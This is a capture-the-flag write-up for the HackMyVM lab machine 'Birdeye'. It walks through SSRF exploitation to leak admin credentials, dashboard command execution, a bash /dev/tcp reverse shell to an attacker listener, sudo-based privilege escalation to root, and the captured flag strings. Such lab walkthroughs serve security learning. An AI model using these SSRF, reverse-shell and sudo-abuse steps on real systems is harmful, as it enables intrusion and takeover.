---
title: Birdeye
author: VoidReign-U
date: 2025-11-12 00:00:00 +0800
categories:
  - Training platform
  - HackMyVm
tags:
  - HackMyVm
  - Medium
  - web
permalink: /HackMyVm/Birdeye.html
---

# Birdeye — CTF Writeup

## Quick Summary
- **Target:** `Birdeye` machine at `192.168.1.102`.  
- **Final Outcome:** Root access obtained; captured flags (`user.txt` and `root.txt`).  
- **Exploited Issues:** SSRF → exposed admin config/credentials → admin panel command execution → RCE as `www-data` → sudo misconfigurations → escalate to `sev` → root.

---

## 1. Initial Recon & Port Scanning
- **Target IP:** `192.168.1.102`

### Rustscan
```bash
rustscan -a 192.168.1.102
# Open 192.168.1.102:80
# Open 192.168.1.102:53
# Open 192.168.1.102:5000
```

### Nmap (important results)
```bash
sudo nmap -sV -sC -p- 192.168.1.102
```
- `53/tcp` — ISC BIND 9.11.3
- `80/tcp` — Apache httpd 2.4.29
- `5000/tcp` — Werkzeug httpd 2.0.3 (Python 3.6.9)  

---

## 2. Directory Bruteforce
I used `feroxbuster` with a common wordlist:
```bash
feroxbuster -u http://192.168.1.102 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Notable findings:
- `/admin/` (redirects to `/admin/`)
- `/admin/.git/logs/`
- `/admin/config` 
- `/javascript/jquery/...`
- various static assets (`/assets/...`)
- `/products` — important for next step

---

## 3. Identifying SSRF via `/api/fetch-url`
On the products page the app called an internal URL like:
```
/api/fetch-url?url=http://localhost:5000/api/products/?search="smart"
```
This indicates a server-side fetch feature that can reach internal services (SSRF).

### Fetching admin config via SSRF
```
curl -i -X GET 'http://192.168.1.102/api/fetch-url?url=http://localhost/admin/config'
```
Response snippet:
```json
{
  "admin_password":"SuperSecret123!",
  "admin_user":"superadmin",
  "login_panel_path":"/admin/panelloginpage"
}
```

> **SSRF response showing admin creds**

---

## 4. Retrieving the Admin Login Page via SSRF
```
curl -i -X GET "http://192.168.1.102/api/fetch-url?url=http://localhost/admin/panelloginpage"
```
The response returned an HTML login form with `admin_user` and `admin_password` fields.

<img src="/assets/img/Birdeye/login_admin.png" alt="image-machine" />

---

## 5. Logging in via SSRF (POST) and Getting Session Cookie
I submitted the login form through the `fetch-url` endpoint using POST:
```bash
curl -iX POST "http://192.168.1.102/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "admin_user=superadmin&admin_password=SuperSecret123\!"
```
The response included a `Set-Cookie: session=...` header — a session cookie usable against the admin panel.

<img src="/assets/img/Birdeye/dashboard.png" alt="image-machine" />

---

## 6. Command Execution from Admin Dashboard (RCE)
Using the session cookie I can POST commands to the admin dashboard:
```bash
curl -v -X POST "http://192.168.1.102/admin/dashboard" \
  -H "Cookie: session=eyJ...;" \
  -d "command=id"
```
Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I also ran:
```bash
-d "command=cat /etc/passwd"
```
This revealed users including `sev` and indicated `www-data` exists.

```bash
root:x:0:0:root:/root:/bin/bash                                         
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                  
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                             
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                             
sync:x:4:65534:sync:/bin:/bin/sync                                               
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                     
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                      
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                              
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                       
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                           
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                                                                                    
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin                                                                    
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin                                                                            
syslog:x:102:106::/home/syslog:/usr/sbin/nologin                                 
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin                                                                                           
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin                                 
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin                                    
bind:x:106:111::/var/cache/bind:/usr/sbin/nologin                                
sev:x:1000:1000:birdeye,,,:/home/sev:/bin/bash                                   
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
```

---

## 7. Getting a Reverse Shell as `www-data`
I spawned a reverse shell from the dashboard to my listener:
```bash
# On attacker machine
nc -lnvp 9001

# Example payload sent via dashboard command:
bash -i >& /dev/tcp/192.168.1.101/9001 0>&1
```
Connection established and I upgraded the shell:
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
# local: stty raw -echo; fg
```


```bash
$ id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                                        
$ which python3                                                                                                                                                                                                      
/usr/bin/python3                                                                                                                                                                                                     
$ python3 -c "import pty;pty.spawn('/bin/bash')"                                                                                                                                                                     
www-data@birdeye:~/birdeye/Server$ export TERM=xterm                                                                                                                                                                 
export TERM=xterm                                                                                                                                                                                                    
www-data@birdeye:~/birdeye/Server$ ^Z                                                                                                                                                                                
zsh: suspended  nc -lnvp 9001                                                                                                                                                                                        
❯ stty raw -echo ;fg                                                                                                                                                                                                 
[1]  + continued  nc -lnvp 9001                                                                                                                                                                                      
                               reset                                             
www-data@birdeye:~/birdeye/Server$ 

```
---

## 8. Privilege Escalation

### Check sudo for `www-data`
```
sudo -l
```
Result showed:
```
( sev ) NOPASSWD: /home/sev/backup_app.sh
```
So `www-data` can run `/home/sev/backup_app.sh` as `sev` without a password.

Inspecting the script:
```
cat /home/sev/backup_app.sh
# #!/bin/bash
# /bin/bash -p
```
The script runs `/bin/bash -p`, so invoking it with `sudo` yields an immediate `sev` shell.  
`www-data` also has permission to **modify** the script, but that isn't required here because the script already spawns a shell as `sev`.

```bash
www-data@birdeye:~/birdeye/Server$ ls -la /home/sev/backup_app.sh  
-rwxrwxrwx 1 sev sev 25 Oct  4 19:41 /home/sev/backup_app.sh   
www-data@birdeye:~/birdeye/Server$ cat /home/sev/backup_app.sh  
#!/bin/bash  
/bin/bash -p  
www-data@birdeye:~/birdeye/Server$ sudo -u sev /home/sev/backup_app.sh  
sev@birdeye:~/birdeye/Server$
```
### Become `sev`
From `www-data`:
```bash
sudo -u sev /home/sev/backup_app.sh
```
Now running as `sev`.

### Check sudo for `sev`
```
sudo -l
# => (ALL) NOPASSWD: /usr/bin/find
```
`sev` can run `find` as root without password. Classic abuse: use `find` to exec a shell.

### Abuse find to get root shell
```
sudo -u root find . -exec /bin/bash \; -quit
```
This gives a shell as `root`.

<img src="/assets/img/Birdeye/root.png" alt="image-machine" />

---

## 9. Flags
- **User flag**
```
cat /home/sev/user.txt
# FLAG{wwwd4t4_t0_s3v_3sc4l4t10n}
```

- **Root flag**
```
cat /root/root.txt
# FLAG{5ev1l_r00t_4cc3ss_4ch13v3d}
```

> **user.txt and root.txt outputs**

---

**End of writeup**
